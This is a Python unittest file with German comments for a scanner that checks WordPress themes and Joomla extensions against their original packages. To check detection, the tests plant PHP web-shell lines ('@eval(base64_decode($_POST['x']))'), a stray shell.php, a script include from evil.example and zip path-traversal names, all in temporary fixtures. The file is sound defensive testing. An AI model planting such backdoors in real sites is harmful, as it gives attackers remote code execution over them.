"""2.4.1 Punkt 5 (Integrität): WordPress-Themes gegen wordpress.org, Joomla-Erweiterungen gegen das Paket des Herstellers.
Alle Abrufe sind nachgebildet (kein Netz); die echten Schnittstellen sind damit NICHT getestet."""
import hashlib
import io
import os
import sys
import tempfile
import threading
import unittest
import zipfile
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.dirname(HERE))

import fixture  # noqa: E402
import wpfixture  # noqa: E402
from test_checks import ADV  # noqa: E402
from claudia import coreref, extsums  # noqa: E402
from claudia.checks import ext_integrity as ei  # noqa: E402
from claudia.engine import Engine, Settings  # noqa: E402
from claudia.registry import load_all  # noqa: E402
from claudia.runner import LocalRunner  # noqa: E402


def zip_of(files):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as z:
        for n, t in files.items():
            z.writestr(n, t)
    return bio.getvalue()


def titles(r):
    return [(f.sev, f.title) for f in r.findings]


def run(w, cid, cms, patches, opts=None):
    """patches: [(Ziel, Schlüsselwörter für mock.patch)]. CLAUDIA_OFFLINE wird für den Lauf entfernt und danach wiederhergestellt."""
    load_all()
    st = Settings(site_dir=w["site_rel"], log_dir="logs", cms=cms, url="", allow_hosts=ADV["allow_hosts"], opts=opts or {})
    eng = Engine(LocalRunner(w["home"], extra_path=w["bin"]), st, ADV)
    started = []
    with mock.patch.dict(os.environ, {}):
        os.environ.pop("CLAUDIA_OFFLINE", None)
        try:
            for target, kw in patches:
                m = mock.patch(target, **kw)
                m.start()
                started.append(m)
            return {x.id: x for x in eng.run([cid], lambda e: None, threading.Event())}[cid]
        finally:
            for m in started:
                m.stop()


class Themes(unittest.TestCase):
    def setUp(self):
        self.w = wpfixture.make_wp_world(tempfile.mkdtemp(prefix="claudia_themes_"), False)
        self.dir = os.path.join(self.w["site"], "wp-content/themes/twentytwentyfive")
        self.orig = {}
        for dp, _, fs in os.walk(self.dir):
            for f in fs:
                p = os.path.join(dp, f)
                self.orig[os.path.relpath(p, self.dir)] = open(p, encoding="utf-8").read()
        self.urls = []

    def fetch(self, url, *a, **k):
        self.urls.append(url)
        assert url.startswith("https://downloads.wordpress.org/theme/"), url
        if "/twentytwentyfive.1.2.zip" in url:
            return zip_of({"twentytwentyfive/" + n: t for n, t in self.orig.items()})
        raise coreref.RefError("%s: HTTP 404" % url)

    def go(self, fetch=None, opts=None):
        return run(self.w, "wp_theme_integrity", "wordpress", [("claudia.coreref.fetch_bytes", {"side_effect": fetch or self.fetch})], opts)

    def test_clean_theme_matches(self):
        r = self.go()
        t = titles(r)
        self.assertTrue(any(s == "ok" and "stimmen mit dem Original" in x for s, x in t), t)
        self.assertFalse(any(s in ("crit", "warn") for s, _ in t), t)
        self.assertEqual(self.urls, ["https://downloads.wordpress.org/theme/twentytwentyfive.1.2.zip"])

    def test_changed_extra_and_missing_files(self):
        with open(os.path.join(self.dir, "functions.php"), "a") as fh:
            fh.write("\n@eval(base64_decode($_POST['x']));\n")
        with open(os.path.join(self.dir, "cache.php"), "w") as fh:
            fh.write("<?php echo 1;")
        os.remove(os.path.join(self.dir, "header.php"))
        r = self.go()
        t = titles(r)
        self.assertTrue(any(s == "crit" and "weichen vom Original ab" in x for s, x in t), t)
        self.assertTrue(any("twentytwentyfive: functions.php" in " ".join(f.items) for f in r.findings))
        self.assertTrue(any(s == "warn" and "zusätzliche PHP" in x for s, x in t), t)
        self.assertTrue(any(s == "info" and "fehlen" in x for s, x in t), t)

    def test_changed_js_counts_but_changed_text_does_not(self):
        js = os.path.join(self.dir, "assets")
        os.makedirs(js, exist_ok=True)
        self.orig["assets/app.js"] = "var a=1;\n"
        open(os.path.join(js, "app.js"), "w").write("var a=1;\n")
        open(os.path.join(self.dir, "readme.txt"), "w").write("a")
        self.orig["readme.txt"] = "a"
        self.assertFalse(any(s == "crit" for s, _ in titles(self.go())))
        open(os.path.join(js, "app.js"), "w").write("var a=1;document.write('<script src=//evil.example/x.js>');\n")
        self.assertTrue(any(s == "crit" for s, _ in titles(self.go())))
        open(os.path.join(js, "app.js"), "w").write("var a=1;\n")
        open(os.path.join(self.dir, "readme.txt"), "w").write("lokal geändert")
        self.assertFalse(any(s == "crit" for s, _ in titles(self.go())))

    def test_unknown_theme_error_and_broken_zip_are_not_alarms(self):
        r = self.go(lambda url, *a, **k: (_ for _ in ()).throw(coreref.RefError("%s: HTTP 404" % url)))
        t = titles(r)
        self.assertFalse(any(s in ("crit", "warn") for s, _ in t), t)
        self.assertTrue(any("nicht prüfbar" in x for _, x in t), t)
        r = self.go(lambda url, *a, **k: b"kein zip")
        self.assertFalse(any(s in ("crit", "warn") for s, _ in titles(r)))
        self.assertTrue(any("Nicht alles konnte geprüft werden" in x for _, x in titles(r)))
        r = self.go(lambda url, *a, **k: (_ for _ in ()).throw(coreref.RefError("keine Verbindung")))
        self.assertFalse(any(s in ("crit", "warn") for s, _ in titles(r)))

    def test_zip_limits(self):
        with self.assertRaises(extsums.ZipProblem):
            extsums.read_zip(b"nope")
        with mock.patch.object(extsums, "MAX_UNPACKED", 10):
            with self.assertRaises(extsums.ZipProblem):
                extsums.read_zip(zip_of({"a.php": "x" * 100}))
        files, _ = extsums.read_zip(zip_of({"x/../evil.php": "1", "/abs.php": "2", "ok/a.php": "3"}))
        self.assertEqual(list(files), ["ok/a.php"])
        self.assertEqual(extsums.theme_url("a b", "1.0"), "https://downloads.wordpress.org/theme/a%20b.1.0.zip")


MANIFEST_COM = ('<?xml version="1.0"?><extension type="component" method="upgrade"><name>Demo2</name><version>2.0.0</version>'
                '<files folder="site"><filename>demo2.php</filename></files>'
                '<administration><files folder="admin"><filename>admin.php</filename></files></administration></extension>')
MANIFEST_PLG = '<?xml version="1.0"?><extension type="plugin" group="system" method="upgrade"><name>Plg</name><version>1.5.0</version><files><filename plugin="plgx">plgx.php</filename></files></extension>'
UPDATE_XML = ('<updates><update><element>%s</element><type>%s</type><folder>%s</folder><client>0</client><version>%s</version><tags><tag>stable</tag></tags>'
              '<downloadurl type="full" format="zip">https://vendor.example/pkg.zip</downloadurl><targetplatform name="joomla" version="[56]\\.[0-9]+"/></update></updates>')


class Joomla(unittest.TestCase):
    def setUp(self):
        self.w = fixture.make_world(tempfile.mkdtemp(prefix="claudia_extint_"), False)
        s = self.w["site"]
        self.files = {
            "components/com_demo2/demo2.php": "<?php echo 'site';",
            "administrator/components/com_demo2/admin.php": "<?php echo 'admin';",
            "plugins/system/plgx/plgx.php": "<?php echo 'plg';",
        }
        for rel, t in self.files.items():
            fixture.w(os.path.join(s, rel), t, days_ago=30)
        self.pkg_com = zip_of({"demo2.xml": MANIFEST_COM, "site/demo2.php": self.files["components/com_demo2/demo2.php"],
                               "admin/admin.php": self.files["administrator/components/com_demo2/admin.php"]})
        self.pkg_plg = zip_of({"plgx.xml": MANIFEST_PLG, "plgx.php": self.files["plugins/system/plgx/plgx.php"]})
        self.rows = [
            {"sid": "1", "eid": "70", "name": "Demo2", "element": "com_demo2", "type": "component", "folder": "", "client": "0", "version": "2.0.0",
             "location": "https://vendor.example/demo2.xml", "needs_key": "0", "age": "10"},
            {"sid": "2", "eid": "71", "name": "Plg", "element": "plgx", "type": "plugin", "folder": "system", "client": "0", "version": "1.5.0",
             "location": "https://vendor.example/plg.xml", "needs_key": "0", "age": "10"},
        ]
        self.pkg_com_plg = [self.pkg_com, self.pkg_plg]
        self.urls = []

    def get(self, url):
        self.urls.append(url)
        if url.endswith("/demo2.xml"):
            return UPDATE_XML % ("com_demo2", "component", "", "2.0.0")
        if url.endswith("/plg.xml"):
            return UPDATE_XML % ("plgx", "plugin", "system", "1.5.0")
        return None

    def fetch(self, url, *a, **k):
        self.urls.append(url)
        raise AssertionError("falscher Abruf %s" % url)

    def go(self, rows=None, get=None, pkgs=None, opts=None):
        seq = iter(self.pkg_com_plg if pkgs is None else pkgs)
        patches = [("claudia.checks.ext_integrity.need_db", {"return_value": object()}),
                   ("claudia.checks.ext_integrity.fetch", {"return_value": self.rows if rows is None else rows}),
                   ("claudia.updcheck._get", {"side_effect": get or self.get}),
                   ("claudia.updcheck.PAUSE", {"new": 0}),
                   ("claudia.coreref.fetch_bytes", {"side_effect": lambda url, *a, **k: next(seq)})]
        return run(self.w, "ext_integrity", "joomla", patches, opts)

    def test_clean_extensions_match(self):
        r = self.go()
        t = titles(r)
        self.assertTrue(any(s == "ok" and "stimmen mit dem Paket" in x for s, x in t), t)
        self.assertFalse(any(s in ("crit", "warn") for s, _ in t), t)

    def test_changed_extra_and_missing(self):
        s = self.w["site"]
        with open(os.path.join(s, "components/com_demo2/demo2.php"), "a") as fh:
            fh.write("@eval($_POST['x']);")
        fixture.w(os.path.join(s, "plugins/system/plgx/shell.php"), "<?php echo 1;", days_ago=1)
        os.remove(os.path.join(s, "administrator/components/com_demo2/admin.php"))
        r = self.go()
        t = titles(r)
        self.assertTrue(any(x_ == "crit" and "weichen vom Paket" in x for x_, x in t), t)
        self.assertTrue(any("com_demo2: components/com_demo2/demo2.php" in " ".join(f.items) for f in r.findings))
        self.assertTrue(any(x_ == "warn" and "zusätzliche" in x for x_, x in t), t)
        self.assertTrue(any("plgx: plugins/system/plgx/shell.php" in " ".join(f.items) for f in r.findings))
        self.assertTrue(any(x_ == "info" and "fehlen" in x for x_, x in t), t)

    def test_version_not_offered_key_required_and_http_are_not_checkable(self):
        self.rows[0]["version"] = "1.9.0"                     # Update-Server bietet nur 2.0.0 an
        self.rows[1]["needs_key"] = "1"
        self.rows.append(dict(self.rows[0], eid="72", name="Alt", location="http://vendor.example/alt.xml", version="2.0.0"))
        r = self.go(pkgs=[])
        t = titles(r)
        self.assertFalse(any(s in ("crit", "warn") for s, _ in t), t)
        items = " ".join(" ".join(f.items) for f in r.findings)
        self.assertIn("bietet diese Version nicht an", items)
        self.assertIn("Lizenzschlüssel", items)
        self.assertIn("ohne https", items)
        self.assertFalse(any(u.startswith("http://") for u in self.urls))

    def test_unreachable_server_and_broken_package_do_not_alarm(self):
        r = self.go(get=lambda url: None)
        self.assertFalse(any(s in ("crit", "warn") for s, _ in titles(r)))
        self.assertTrue(any("Nicht alles konnte geprüft werden" in x for _, x in titles(r)))
        r = self.go(pkgs=[b"kein zip", b"auch nicht"])
        self.assertFalse(any(s in ("crit", "warn") for s, _ in titles(r)))

    def test_limit_and_one_request_per_package(self):
        self.go(opts={"ext_integrity": {"max": 1}})
        self.assertEqual(self.urls.count("https://vendor.example/demo2.xml"), 1)
        self.assertNotIn("https://vendor.example/plg.xml", self.urls)

    def test_mapping_and_parsers(self):
        td = extsums.target_dirs(MANIFEST_COM, {"type": "component", "element": "com_demo2"})
        self.assertEqual(td, [("site", "components/com_demo2"), ("admin", "administrator/components/com_demo2")])
        self.assertEqual(extsums.target_dirs(MANIFEST_PLG, {"type": "plugin", "element": "plgx", "folder": "system"}), [("", "plugins/system/plgx")])
        self.assertEqual(extsums.target_dirs(MANIFEST_PLG, {"type": "module", "element": "mod_x", "client": 0}), [])          # Art passt nicht
        self.assertEqual(extsums.target_dirs('<!DOCTYPE x><extension type="plugin"/>', {"type": "plugin", "element": "plgx", "folder": "system"}), [])
        self.assertEqual(extsums.target_dirs(MANIFEST_PLG, {"type": "plugin", "element": "../evil", "folder": "system"}), [])
        self.assertEqual(extsums.entries_with_downloads("<!DOCTYPE x><updates/>", "6.2.0"), [])
        e = extsums.entries_with_downloads(UPDATE_XML % ("plgx", "plugin", "system", "1.5.0"), "6.2.0")
        self.assertEqual(e[0]["urls"], ["https://vendor.example/pkg.zip"])
        self.assertEqual(extsums.entries_with_downloads(UPDATE_XML % ("plgx", "plugin", "system", "1.5.0"), "3.10.0"), [])    # falsche Joomla-Version
        loc = extsums.parse_local(hashlib.sha256(b"a").hexdigest() + "  ./components/com_a/x/y.php\n", ["components/com_a", "components/com_a/x"])
        self.assertEqual(list(loc["components/com_a/x"]), ["y.php"])
        self.assertEqual(loc["components/com_a"], {})


if __name__ == "__main__":
    unittest.main()
